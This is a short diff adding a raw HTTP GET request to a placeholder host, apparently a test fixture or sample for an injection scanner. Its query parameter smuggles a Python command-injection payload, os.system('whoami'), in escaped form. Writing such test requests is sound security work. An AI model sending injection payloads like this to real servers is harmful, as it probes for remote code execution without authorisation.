@@ -1,0 +1,4 @@
+GET /a?page=z%3Dos.system(\u0027whoami\u0027) HTTP/1.1
+Host: demo.example.com
+Connection: close
+
